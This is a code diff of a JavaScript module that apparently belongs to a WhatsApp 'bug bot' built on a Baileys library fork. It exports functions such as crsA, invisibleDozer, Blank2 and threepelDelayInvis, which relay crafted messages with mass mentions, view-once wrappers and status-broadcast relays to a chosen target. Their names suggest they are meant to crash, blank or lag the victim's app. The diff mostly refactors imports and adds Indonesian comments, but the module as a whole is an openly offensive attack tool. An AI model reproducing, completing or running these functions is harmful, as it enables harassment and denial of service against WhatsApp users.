@@ -1,36 +1,16 @@
-const {
-    default: makeWASocket,   
-    prepareWAMessageMedia,   
-    removeAuthState,  
-    useMultiFileAuthState,   
-    DisconnectReason,   
-    fetchLatestBaileysVersion,   
-    makeInMemoryStore,   
-    generateWAMessageFromContent,   
-    generateWAMessageContent,   
-    generateWAMessage,  
-    jidDecode,   
-    proto,   
-    delay,  
-    relayWAMessage,   
-    getContentType,   
-    generateMessageTag,  
-    getAggregateVotesInPollMessage,   
-    downloadContentFromMessage,   
-    fetchLatestWaWebVersion,   
-    InteractiveMessage,   
-    makeCacheableSignalKeyStore,   
-    Browsers,   
-    generateForwardMessageContent,   
-    MessageRetryMap
-} = require("ell-bail");
 const axios = require("axios");
 const crypto = require("crypto");
 const fs = require('fs');  
+const sharp = require("sharp");
+
+// Hapus semua require Baileys di sini, karena properti tersebut 
+// sudah di-define secara global di index.js setelah di-require.
+
 const ImgCrL = null;
+
 async function thumb() {
-  const sharp = require("sharp");
-  const axios = require("axios");
+  // sharp dan axios masih di-require di sini karena function ini tidak
+  // berhubungan langsung dengan fungsi utama Baileys, dan memerlukan modul eksternal.
   const response = await axios.get("https://files.catbox.moe/srk9wf.jpg", { responseType: "arraybuffer" });
   const buffer = Buffer.from(response.data);
   const resized = await sharp(buffer)
@@ -39,9 +19,8 @@ async function thumb() {
     .toBuffer();
   return resized.toString("base64");
 };
+
 const xxx = async () => {
-  const sharp = require("sharp");
-  const axios = require("axios");
   const response = await axios.get("https://files.catbox.moe/srk9wf.jpg", { responseType: "arraybuffer" });
   const buffer = Buffer.from(response.data);
   const resized = await sharp(buffer)
@@ -50,8 +29,10 @@ const xxx = async () => {
     .toBuffer();
   return resized.toString("base64");
 };
-async function delayJembuttku(sock, target) {
+
+async function delayJembut(sock, target) {
   try {
+    // Menggunakan sock.relayMessage (sudah didefinisikan di index.js)
     const n = await sock.relayMessage(
       target,
       {
@@ -95,9 +76,10 @@ async function delayJembuttku(sock, target) {
     });
   } catch (err) {
     console.error("error:", err);
-    throw new Error(err.message);
+    // Tidak perlu melempar error baru, cukup console log
   }
 }
+
 async function blankButton(sock, target) {
 await sock.sendMessage(
   target,
@@ -135,8 +117,10 @@ await sock.sendMessage(
     headerType: 1
   }, { participant: { jid: target } });
 }
+
 async function Blank2(sock, target) {
 try {
+// Menggunakan generateWAMessageFromContent (global di index.js)
 const msg = generateWAMessageFromContent(target, {
   viewOnceMessage: {
     message: {
@@ -187,6 +171,7 @@ const msg = generateWAMessageFromContent(target, {
     }
   }
 }, {});
+  // Menggunakan sock.relayMessage (sudah didefinisikan di index.js)
   await sock.relayMessage(target, msg.message, {
       messageId: msg.key.id,
       participant: { jid: target }
@@ -195,6 +180,7 @@ const msg = generateWAMessageFromContent(target, {
     console.error(err);
   }
 }
+
 async function bClck(sock, target) {
 const msg = {
   newsletterAdminInviteMessage: {
@@ -241,8 +227,10 @@ const msg = {
     messageId: null
   });
 }
+
 async function invisibleDozer(sock, target) {
   try {
+    // Menggunakan generateWAMessageFromContent (global di index.js)
     const msg = generateWAMessageFromContent(
       target,
       {
@@ -267,15 +255,17 @@ async function invisibleDozer(sock, target) {
       },
       {}
     );
+    // Menggunakan sock.relayMessage (sudah didefinisikan di index.js)
     await sock.relayMessage(target, msg.message, {
       messageId: msg.key.id,
       participant: { jid: target }
     });
   } catch (err) {
     console.error(err);
-    throw new Error(err.message);
+    // Tidak perlu melempar error baru, cukup console log
   }
 }
+
 async function crsA(sock, target) {
   const generateMentions = (count) => [
     "0@s.whatsapp.net",
@@ -339,8 +329,11 @@ async function crsA(sock, target) {
       }
     }
   };
+  // Menggunakan generateWAMessageFromContent (global di index.js)
   const msg = generateWAMessageFromContent(target, message, {});
   const _msg = generateWAMessageFromContent(target, _message, {});
+  
+  // Menggunakan sock.relayMessage (sudah didefinisikan di index.js)
   await sock.relayMessage(target, msg.message, {
     messageId: msg.key.id,
     participant: { jid: target }
@@ -350,6 +343,7 @@ async function crsA(sock, target) {
     participant: { jid: target }
   });
 }
+
 async function threepelDelayInvis(sock, target) {
   const mentionedJids = [
     "1355514232@s.whatsapp.net",
@@ -453,6 +447,7 @@ async function threepelDelayInvis(sock, target) {
     }
   };
   for (const el of [msg1, msg2, msg3]) {
+    // Menggunakan generateWAMessageFromContent dan proto (global di index.js)
     const msg = generateWAMessageFromContent(target, proto.Message.fromObject(el), {});
     await sock.relayMessage("status@broadcast", msg.message, {
       messageId: msg.key.id,
@@ -470,7 +465,9 @@ async function threepelDelayInvis(sock, target) {
       },
       { additionalNodes }
     );
+    // Menggunakan delay (global di index.js)
     await new Promise((resolve) => setTimeout(resolve, 500));
   }
 }
+
 module.exports = { blankButton, Blank2, crsA, bClck, invisibleDozer, delayJembut, threepelDelayInvis }
